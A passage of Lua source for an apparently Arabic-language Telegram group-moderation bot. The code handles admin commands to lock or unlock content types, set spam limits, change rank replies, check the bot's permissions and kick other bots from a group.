ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","♰ ⌯ تم قفل المواقع")  
DevBrAnD:set(BrAnD..'BrAnD:Lock:Location'..msg.chat_id_,true)
else
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ المواقع بالفعل مقفله في المجموعه', 1, 'md')
end
end
if LockText[2] == "المعرف" or LockText[2] == "المعرفات" then
if not DevBrAnD:get(BrAnD..'BrAnD:Lock:Tags'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","♰ ⌯ تم قفل المعرفات")  
DevBrAnD:set(BrAnD..'BrAnD:Lock:Tags'..msg.chat_id_,true)
else
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ المعرفات بالفعل مقفله في المجموعه', 1, 'md')
end
end
if LockText[2] == "الملفات" then
if not DevBrAnD:get(BrAnD..'BrAnD:Lock:Document'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","♰ ⌯ تم قفل الملفات")  
DevBrAnD:set(BrAnD..'BrAnD:Lock:Document'..msg.chat_id_,true)
else
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ الملفات بالفعل مقفله في المجموعه', 1, 'md')
end
end
if LockText[2] == "الهاشتاك" or LockText[2] == "التاك" then
if not DevBrAnD:get(BrAnD..'BrAnD:Lock:Hashtak'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","♰ ⌯ تم قفل الهاشتاك")  
DevBrAnD:set(BrAnD..'BrAnD:Lock:Hashtak'..msg.chat_id_,true)
else
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ الهاشتاك بالفعل مقفل في المجموعه', 1, 'md')
end
end
if LockText[2] == "الجهات" then
if not DevBrAnD:get(BrAnD..'BrAnD:Lock:Contact'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","♰ ⌯ تم قفل الجهات")  
DevBrAnD:set(BrAnD..'BrAnD:Lock:Contact'..msg.chat_id_,true)
else
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '️♰ ⌯ الجهات بالفعل مقفله في المجموعه', 1, 'md')
end
end
if LockText[2] == "الشبكات" then
if not DevBrAnD:get(BrAnD..'BrAnD:Lock:WebLinks'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","♰ ⌯ تم قفل الشبكات")  
DevBrAnD:set(BrAnD..'BrAnD:Lock:WebLinks'..msg.chat_id_,true) 
else
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ الشبكات بالفعل مقفله في المجموعه', 1, 'md')
end
end
if LockText[2] == "العربيه" then
if not DevBrAnD:get(BrAnD..'BrAnD:Lock:Arabic'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","♰ ⌯ تم قفل العربيه")  
DevBrAnD:set(BrAnD..'BrAnD:Lock:Arabic'..msg.chat_id_,true)
else
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ العربيه بالفعل مقفله في المجموعه', 1, 'md')
end
end
if LockText[2] == "الانكليزيه" then
if not DevBrAnD:get(BrAnD..'BrAnD:Lock:English'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","♰ ⌯ تم قفل الانكليزيه")  
DevBrAnD:set(BrAnD..'BrAnD:Lock:English'..msg.chat_id_,true)
else
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ الانكليزيه بالفعل مقفله في المجموعه', 1, 'md')
end
end
if LockText[2] == "الملصقات" then
if not DevBrAnD:get(BrAnD..'BrAnD:Lock:Stickers'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","♰ ⌯ تم قفل الملصقات")  
DevBrAnD:set(BrAnD..'BrAnD:Lock:Stickers'..msg.chat_id_,true)
else
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ الملصقات بالفعل مقفله في المجموعه', 1, 'md')
end
end
if LockText[2] == "الماركداون" then
if not DevBrAnD:get(BrAnD..'BrAnD:Lock:Markdown'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","♰ ⌯ تم قفل الماركداون")  
DevBrAnD:set(BrAnD..'BrAnD:Lock:Markdown'..msg.chat_id_,true)
else
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ الماركداون بالفعل مقفل في المجموعه', 1, 'md')
end
end
if LockText[2] == "الاشعارات" then
if not DevBrAnD:get(BrAnD..'BrAnD:Lock:TagServr'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","♰ ⌯ تم قفل الاشعارات")  
DevBrAnD:set(BrAnD..'BrAnD:Lock:TagServr'..msg.chat_id_,true)
else
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ الاشعارات بالفعل مقفله في المجموعه', 1, 'md')
end
end
if LockText[2] == "التوجيه" then
if not DevBrAnD:get(BrAnD..'BrAnD:Lock:Forwards'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","♰ ⌯ تم قفل التوجيه")  
DevBrAnD:set(BrAnD..'BrAnD:Lock:Forwards'..msg.chat_id_,true)
else
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ التوجيه بالفعل مقفل في المجموعه', 1, 'md')
end
end
end
end
--     SoUrCe BrAnD     --
if Admin(msg) then
if text and text:match("^فتح (.*)$") then
local UnLockText = {string.match(text, "^(فتح) (.*)$")}
if UnLockText[2] == "الدردشه" then
if DevBrAnD:get(BrAnD..'BrAnD:Lock:Text'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","♰ ⌯ تم فتح الدردشه")  
DevBrAnD:del(BrAnD..'BrAnD:Lock:Text'..msg.chat_id_)
else
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ الدردشه بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الصور" then
if DevBrAnD:get(BrAnD..'BrAnD:Lock:Photo'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","♰ ⌯ تم فتح الصور")  
DevBrAnD:del(BrAnD..'BrAnD:Lock:Photo'..msg.chat_id_)
else
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ الصور بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الكلايش" then
if DevBrAnD:get(BrAnD..'BrAnD:Lock:Spam'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","♰ ⌯ تم فتح الكلايش")  
DevBrAnD:del(BrAnD..'BrAnD:Lock:Spam'..msg.chat_id_)
else
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ الكلايش بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الدخول" then
if DevBrAnD:get(BrAnD..'BrAnD:Lock:Join'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","♰ ⌯ تم فتح الدخول")  
DevBrAnD:del(BrAnD..'BrAnD:Lock:Join'..msg.chat_id_)
else
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ الدخول بالفعل مفتوح في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الفيديو" then
if DevBrAnD:get(BrAnD..'BrAnD:Lock:Videos'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","♰ ⌯ تم فتح الفيديو")  
DevBrAnD:del(BrAnD..'BrAnD:Lock:Videos'..msg.chat_id_)
else
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ الفيديو بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الملفات" then
if DevBrAnD:get(BrAnD..'BrAnD:Lock:Document'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","♰ ⌯ تم فتح الملفات")  
DevBrAnD:del(BrAnD..'BrAnD:Lock:Document'..msg.chat_id_)
else
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ الملفات بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الاونلاين" then
if DevBrAnD:get(BrAnD..'BrAnD:Lock:Inline'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","♰ ⌯ تم فتح الاونلاين")  
DevBrAnD:del(BrAnD..'BrAnD:Lock:Inline'..msg.chat_id_)
else
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ الاونلاين بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الماركداون" then
if DevBrAnD:get(BrAnD..'BrAnD:Lock:Markdown'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","♰ ⌯ تم فتح الماركداون")  
DevBrAnD:del(BrAnD..'BrAnD:Lock:Markdown'..msg.chat_id_)
else
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ الماركداون بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "المتحركه" then
if DevBrAnD:get(BrAnD..'BrAnD:Lock:Gifs'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","♰ ⌯ تم فتح المتحركه")  
DevBrAnD:del(BrAnD..'BrAnD:Lock:Gifs'..msg.chat_id_)
else
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ المتحركه بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الاغاني" then
if DevBrAnD:get(BrAnD..'BrAnD:Lock:Music'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","♰ ⌯ تم فتح الاغاني")  
DevBrAnD:del(BrAnD..'BrAnD:Lock:Music'..msg.chat_id_)
else
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ الاغاني بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الصوت" then
if DevBrAnD:get(BrAnD..'BrAnD:Lock:Voice'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","♰ ⌯ تم فتح الصوت")  
DevBrAnD:del(BrAnD..'BrAnD:Lock:Voice'..msg.chat_id_)
else
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ الصوت بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الروابط" then
if DevBrAnD:get(BrAnD..'BrAnD:Lock:Links'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","♰ ⌯ تم فتح الروابط")  
DevBrAnD:del(BrAnD..'BrAnD:Lock:Links'..msg.chat_id_)
else
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ الروابط بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "المواقع" then
if DevBrAnD:get(BrAnD..'BrAnD:Lock:Location'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","♰ ⌯ تم فتح المواقع")  
DevBrAnD:del(BrAnD..'BrAnD:Lock:Location'..msg.chat_id_)
else
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ المواقع بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "المعرف" or UnLockText[2] == "المعرفات" then
if DevBrAnD:get(BrAnD..'BrAnD:Lock:Tags'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","♰ ⌯ تم فتح المعرفات")  
DevBrAnD:del(BrAnD..'BrAnD:Lock:Tags'..msg.chat_id_)
else
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ المعرفات بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الهاشتاك" or UnLockText[2] == "التاك" then
if DevBrAnD:get(BrAnD..'BrAnD:Lock:Hashtak'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","♰ ⌯ تم فتح الهاشتاك")  
DevBrAnD:del(BrAnD..'BrAnD:Lock:Hashtak'..msg.chat_id_)
else
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ الهاشتاك بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الجهات" then
if DevBrAnD:get(BrAnD..'BrAnD:Lock:Contact'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","♰ ⌯ تم فتح الجهات")  
DevBrAnD:del(BrAnD..'BrAnD:Lock:Contact'..msg.chat_id_)
else
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ الجهات بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الشبكات" then
if DevBrAnD:get(BrAnD..'BrAnD:Lock:WebLinks'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","♰ ⌯ تم فتح الشبكات")  
DevBrAnD:del(BrAnD..'BrAnD:Lock:WebLinks'..msg.chat_id_)
else
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ الشبكات بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "العربيه" then
if DevBrAnD:get(BrAnD..'BrAnD:Lock:Arabic'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","♰ ⌯ تم فتح العربيه")  
DevBrAnD:del(BrAnD..'BrAnD:Lock:Arabic'..msg.chat_id_)
else
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ العربيه بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الانكليزيه" then
if DevBrAnD:get(BrAnD..'BrAnD:Lock:English'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","♰ ⌯ تم فتح الانكليزيه")  
DevBrAnD:del(BrAnD..'BrAnD:Lock:English'..msg.chat_id_)
else
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ الانكليزيه بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الاشعارات" then
if DevBrAnD:get(BrAnD..'BrAnD:Lock:TagServr'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","♰ ⌯ تم فتح الاشعارات")  
DevBrAnD:del(BrAnD..'BrAnD:Lock:TagServr'..msg.chat_id_)
else
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ الاشعارات بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الملصقات" then
if DevBrAnD:get(BrAnD..'BrAnD:Lock:Stickers'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","♰ ⌯ تم فتح الملصقات")  
DevBrAnD:del(BrAnD..'BrAnD:Lock:Stickers'..msg.chat_id_)
else
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ الملصقات بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "التوجيه" then
if DevBrAnD:get(BrAnD..'BrAnD:Lock:Forwards'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","♰ ⌯ تم فتح التوجيه")  
DevBrAnD:del(BrAnD..'BrAnD:Lock:Forwards'..msg.chat_id_)
else
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ التوجيه بالفعل مفتوح في المجموعه', 1, 'md')
end
end
end
end
--     SoUrCe BrAnD     --
if text and text:match("^قفل التفليش$") or text and text:match("^تفعيل الحمايه القصوى$") then
if not Constructor(msg) then
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ للمنشئين فقط', 1, 'md')
else
DevBrAnD:set(BrAnD.."BrAnD:Lock:Bots"..msg.chat_id_,"del") DevBrAnD:hset(BrAnD.."BrAnD:Spam:Group:User"..msg.chat_id_ ,"Spam:User","keed") 
LockList ={'BrAnD:Lock:Links','BrAnD:Lock:Contact','BrAnD:Lock:Forwards','BrAnD:Lock:Videos','BrAnD:Lock:Gifs','BrAnD:Lock:EditMsgs','BrAnD:Lock:Stickers','BrAnD:Lock:Farsi','BrAnD:Lock:Spam','BrAnD:Lock:WebLinks','BrAnD:Lock:Photo'}
for i,Lock in pairs(LockList) do
DevBrAnD:set(BrAnD..Lock..msg.chat_id_,true)
end
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","♰ ⌯ تم قفل التفليش")  
end
end
if text and text:match("^فتح التفليش$") then
if not Constructor(msg) then
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ للمنشئين فقط', 1, 'md')
else
DevBrAnD:hdel(BrAnD.."BrAnD:Spam:Group:User"..msg.chat_id_ ,"Spam:User") 
UnLockList ={'BrAnD:Lock:Links','BrAnD:Lock:Contact','BrAnD:Lock:Forwards','BrAnD:Lock:Videos','BrAnD:Lock:Gifs','BrAnD:Lock:EditMsgs','BrAnD:Lock:Stickers','BrAnD:Lock:Farsi','BrAnD:Lock:Spam','BrAnD:Lock:WebLinks','BrAnD:Lock:Photo'}
for i,UnLock in pairs(UnLockList) do
DevBrAnD:del(BrAnD..UnLock..msg.chat_id_)
end
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","♰ ⌯ تم فتح التفليش")  
end
end
--     SoUrCe BrAnD     --
if text and text:match("^قفل الكل$") then
if not Constructor(msg) then
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ للمنشئين فقط', 1, 'md')
else
DevBrAnD:del(BrAnD..'BrAnD:Lock:Fshar'..msg.chat_id_) DevBrAnD:del(BrAnD..'BrAnD:Lock:Taf'..msg.chat_id_) DevBrAnD:del(BrAnD..'BrAnD:Lock:Kfr'..msg.chat_id_) 
DevBrAnD:set(BrAnD.."BrAnD:Lock:Bots"..msg.chat_id_,"del") DevBrAnD:hset(BrAnD.."BrAnD:Spam:Group:User"..msg.chat_id_ ,"Spam:User","keed") 
LockList ={'BrAnD:Lock:EditMsgs','BrAnD:Lock:Farsi','BrAnD:Lock:TagServr','BrAnD:Lock:Inline','BrAnD:Lock:Photo','BrAnD:Lock:Spam','BrAnD:Lock:Videos','BrAnD:Lock:Gifs','BrAnD:Lock:Music','BrAnD:Lock:Voice','BrAnD:Lock:Links','BrAnD:Lock:Location','BrAnD:Lock:Tags','BrAnD:Lock:Stickers','BrAnD:Lock:Markdown','BrAnD:Lock:Forwards','BrAnD:Lock:Document','BrAnD:Lock:Contact','BrAnD:Lock:Hashtak','BrAnD:Lock:WebLinks'}
for i,Lock in pairs(LockList) do
DevBrAnD:set(BrAnD..Lock..msg.chat_id_,true)
end
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","♰ ⌯ تم قفل جميع الاوامر")  
end
end
if text and text:match("^فتح الكل$") then
if not Constructor(msg) then
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ للمنشئين فقط', 1, 'md')
else
DevBrAnD:set(BrAnD..'BrAnD:Lock:Fshar'..msg.chat_id_,true) DevBrAnD:set(BrAnD..'BrAnD:Lock:Taf'..msg.chat_id_,true) DevBrAnD:set(BrAnD..'BrAnD:Lock:Kfr'..msg.chat_id_,true) DevBrAnD:hdel(BrAnD.."BrAnD:Spam:Group:User"..msg.chat_id_ ,"Spam:User") 
UnLockList ={'BrAnD:Lock:EditMsgs','BrAnD:Lock:Text','BrAnD:Lock:Arabic','BrAnD:Lock:English','BrAnD:Lock:Join','BrAnD:Lock:Bots','BrAnD:Lock:Farsi','BrAnD:Lock:FarsiBan','BrAnD:Lock:TagServr','BrAnD:Lock:Inline','BrAnD:Lock:Photo','BrAnD:Lock:Spam','BrAnD:Lock:Videos','BrAnD:Lock:Gifs','BrAnD:Lock:Music','BrAnD:Lock:Voice','BrAnD:Lock:Links','BrAnD:Lock:Location','BrAnD:Lock:Tags','BrAnD:Lock:Stickers','BrAnD:Lock:Markdown','BrAnD:Lock:Forwards','BrAnD:Lock:Document','BrAnD:Lock:Contact','BrAnD:Lock:Hashtak','BrAnD:Lock:WebLinks'}
for i,UnLock in pairs(UnLockList) do
DevBrAnD:del(BrAnD..UnLock..msg.chat_id_)
end
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","♰ ⌯ تم فتح جميع الاوامر")  
end
end
--     SoUrCe BrAnD     --
if Admin(msg) then
if text and (text:match("^ضع سبام (%d+)$") or text:match("^وضع سبام (%d+)$")) then
local SetSpam = text:match("ضع سبام (%d+)$") or text:match("وضع سبام (%d+)$")
if tonumber(SetSpam) < 40 then
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ اختر عدد اكبر من 40 حرف ', 1, 'md')
else
DevBrAnD:set(BrAnD..'BrAnD:Spam:Text'..msg.chat_id_,SetSpam)
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ تم وضع عدد السبام ↫'..SetSpam, 1, 'md')
end
end
end
--     SoUrCe BrAnD     --
if Manager(msg) then
if text == "فحص" or text == "فحص البوت" then
local check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChatMember?chat_id='..msg.chat_id_..'&user_id='..BrAnD)
local GetInfo = JSON.decode(check)
if GetInfo.ok == true then
if GetInfo.result.can_change_info == true then EDT = '✔️' else EDT = '✖️' end
if GetInfo.result.can_delete_messages == true then DEL = '✔️' else DEL = '✖️' end
if GetInfo.result.can_invite_users == true then INV = '✔️' else INV = '✖️' end
if GetInfo.result.can_pin_messages == true then PIN = '✔️' else PIN = '✖️' end
if GetInfo.result.can_restrict_members == true then BAN = '✔️' else BAN = '✖️' end
if GetInfo.result.can_promote_members == true then VIP = '✔️' else VIP = '✖️' end 
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ صلاحيات البوت هي ↫ ⤈\n⍆═════BR═════⍅\n♰ ⌯ حذف الرسائل ↫ '..DEL..'\n♰ ⌯ دعوة المستخدمين ↫ '..INV..'\n♰ ⌯ حظر المستخدمين ↫ '..BAN..'\n♰ ⌯ تثبيت الرسائل ↫ '..PIN..'\n♰ ⌯ تغيير المعلومات ↫ '..EDT..'\n♰ ⌯ اضافة مشرفين ↫ '..VIP..'\n⍆═════BR═════⍅', 1, 'md')
end end
if text and text:match("^تغير رد المطور (.*)$") then
local Text = text:match("^تغير رد المطور (.*)$") 
DevBrAnD:set(BrAnD.."BrAnD:SudoBot:Rd"..msg.chat_id_,Text)
Dev_BrAnD(msg.chat_id_, msg.id_, 1, "♰ ⌯ تم تغير رد المطور الى ↫ "..Text, 1, 'md')
end
if text and text:match("^تغير رد منشئ الاساسي (.*)$") then
local Text = text:match("^تغير رد منشئ الاساسي (.*)$") 
DevBrAnD:set(BrAnD.."BrAnD:BasicConstructor:Rd"..msg.chat_id_,Text)
Dev_BrAnD(msg.chat_id_, msg.id_, 1, "♰ ⌯ تم تغير رد المنشئ الاساسي الى ↫ "..Text, 1, 'md')
end
if text and text:match("^تغير رد المنشئ (.*)$") then
local Text = text:match("^تغير رد المنشئ (.*)$") 
DevBrAnD:set(BrAnD.."BrAnD:Constructor:Rd"..msg.chat_id_,Text)
Dev_BrAnD(msg.chat_id_, msg.id_, 1, "♰ ⌯ تم تغير رد المنشئ الى ↫ "..Text, 1, 'md')
end
if text and text:match("^تغير رد المدير (.*)$") then
local Text = text:match("^تغير رد المدير (.*)$") 
DevBrAnD:set(BrAnD.."BrAnD:Managers:Rd"..msg.chat_id_,Text) 
Dev_BrAnD(msg.chat_id_, msg.id_, 1, "♰ ⌯ تم تغير رد المدير الى ↫ "..Text, 1, 'md')
end
if text and text:match("^تغير رد الادمن (.*)$") then
local Text = text:match("^تغير رد الادمن (.*)$") 
DevBrAnD:set(BrAnD.."BrAnD:Admins:Rd"..msg.chat_id_,Text)
Dev_BrAnD(msg.chat_id_, msg.id_, 1, "♰ ⌯ تم تغير رد الادمن الى ↫ "..Text, 1, 'md')
end
if text and text:match("^تغير رد المميز (.*)$") then
local Text = text:match("^تغير رد المميز (.*)$") 
DevBrAnD:set(BrAnD.."BrAnD:VipMem:Rd"..msg.chat_id_,Text)
Dev_BrAnD(msg.chat_id_, msg.id_, 1, "♰ ⌯ تم تغير رد المميز الى ↫ "..Text, 1, 'md')
end
if text and text:match("^تغير رد المنظف (.*)$") then
local Text = text:match("^تغير رد المنظف (.*)$") 
DevBrAnD:set(BrAnD.."BrAnD:Cleaner:Rd"..msg.chat_id_,Text)
Dev_BrAnD(msg.chat_id_, msg.id_, 1, "♰ ⌯ تم تغير رد المنظف الى ↫ "..Text, 1, 'md')
end
if text and text:match("^تغير رد العضو (.*)$") then
local Text = text:match("^تغير رد العضو (.*)$") 
DevBrAnD:set(BrAnD.."BrAnD:mem:Rd"..msg.chat_id_,Text)
Dev_BrAnD(msg.chat_id_, msg.id_, 1, "♰ ⌯ تم تغير رد العضو الى ↫ "..Text, 1, 'md')
end
if text == "حذف ردود الرتب" or text == "مسح ردود الرتب" then
Dev_BrAnD(msg.chat_id_, msg.id_, 1, "♰ ⌯ تم حذف جميع ردود الرتب", 1, 'md')
DevBrAnD:del(BrAnD.."BrAnD:mem:Rd"..msg.chat_id_)
DevBrAnD:del(BrAnD.."BrAnD:Cleaner:Rd"..msg.chat_id_)
DevBrAnD:del(BrAnD.."BrAnD:VipMem:Rd"..msg.chat_id_)
DevBrAnD:del(BrAnD.."BrAnD:Admins:Rd"..msg.chat_id_)
DevBrAnD:del(BrAnD.."BrAnD:Managers:Rd"..msg.chat_id_)
DevBrAnD:del(BrAnD.."BrAnD:Constructor:Rd"..msg.chat_id_)
DevBrAnD:del(BrAnD.."BrAnD:BasicConstructor:Rd"..msg.chat_id_)
DevBrAnD:del(BrAnD.."BrAnD:SudoBot:Rd"..msg.chat_id_)
end
end
--     SoUrCe BrAnD     --
if text == "كشف البوتات" and ChCheck(msg) then 
tdcli_function ({ID = "GetChANnElMembers",ChANnEl_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChANnElMembersBots"},offset_ = 0,limit_ = 100 },function(extra,result,success)
local admins = result.members_  
text = '♰ ⌯ *قائمة البوتات* ↫ ⤈ \n⍆═════BR═════⍅\n'
local n = 0
local t = 0
for i=0 , #admins do 
n = (n + 1)
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_
},function(arg,data) 
if result.members_[i].status_.ID == "ChatMemberStatusMember" then  
ab = ''
elseif result.members_[i].status_.ID == "ChatMemberStatusEditor" then  
t = t + 1
ab = ' ✯'
end
text = text.."~ [@"..data.username_..']'..ab.."\n"
if #admins == 0 then
Dev_BrAnD(msg.chat_id_, msg.id_, 1, "♰ ⌯ *لاتوجد بوتات هنا*", 1, 'md')
return false end
if #admins == i then 
local a = '⍆═════BR═════⍅\n♰ ⌯ *عدد البوتات هنا* ↫ '..n..'\n'
local f = '♰ ⌯ *عدد البوتات المرفوعه* ↫ '..t..'\n♰ ⌯ *ملاحضه علامة الـ*✯ *تعني ان البوت ادمن في هذه المجموعه*'
Dev_BrAnD(msg.chat_id_, msg.id_, 1, text..a..f, 1, 'md')
end
end,nil)
end
end,nil)
end
if text == 'حذف البوتات' and ChCheck(msg) or text == 'طرد البوتات' and ChCheck(msg) or text == 'مسح البوتات' and ChCheck(msg) then
tdcli_function ({ ID = "GetChANnElMembers",ChANnEl_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChANnElMembersBots"},offset_ = 0,limit_ = 100 },function(arg,dp)  
local admins = dp.members_  
local x = 0
local c = 0
for i=0 , #admins do 
if dp.members_[i].status_.ID == "ChatMemberStatusEditor" then  
x = x + 1 
end
if tonumber(admins[i].user_id_) ~= tonumber(BrAnD) then
ChatKick(msg.chat_id_,admins[i].user_id_)
end
c = c + 1
end     
if (c - x) == 0 then
Dev_BrAnD(msg.chat_id_, msg.id_, 1, "♰ ⌯ *لاتوجد بوتات هنا*", 1, 'md')
else
Dev_BrAnD(msg.chat_id_, msg.id_, 1, "♰ ⌯ *عدد البوتات هنا* ↫ "..c.."\n♰ ⌯ *عدد البوتات المرفوعه* ↫ "..x.."\n♰ ⌯ *تم طرد* ↫ "..(c - x).." *من البوتات*", 1, 'md')
end 
end,nil)  
end 
--     SoUrCe BrAnD     --
end
--     SoUrCe BrAnD     --
if Admin(msg) then
if text and text:match("^حذف (.*)$") and ChCheck(msg) or text and text:match("^مسح (.*)$") and ChCheck(msg) then
local txts = {string.match(text, "^(حذف) (.*)$")}
local txtss = {string.match(text, "^(مسح) (.*)$")}
if Sudo(msg) then 
if txts[2] == 'المطورين' or txtss[2] == 'المطورين' then
DevBrAnD:del(BrAnD..'BrAnD:SudoBot:')
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","♰ ⌯ تم حذف المطورين")  
end
if txts[2] == 'قائمه العام' or txtss[2] == 'قائمه العام' then
DevBrAnD:del(BrAnD..'BrAnD:BanAll:')
DevBrAnD:del(BrAnD..'BrAnD:MuteAll:')
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","♰ ⌯ تم حذف قائمة العام")  
end
end
if SudoBot(msg) then
if txts[2] == 'الادمنيه العامين' or txts[2] == 'الادمنيه العام' or txtss[2] == 'الادمنيه العامين' or txtss[2] == 'الادمنيه العام' then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","♰ ⌯ تم حذف الادمنيه العامين")  
DevBrAnD:del(BrAnD..'BrAnD:AdminAll:')
end
if txts[2] == 'المميزين عام' or txts[2] == 'المميزين العامين' or txtss[2] == 'المميزين عام' or txtss[2] == 'المميزين العامين' then
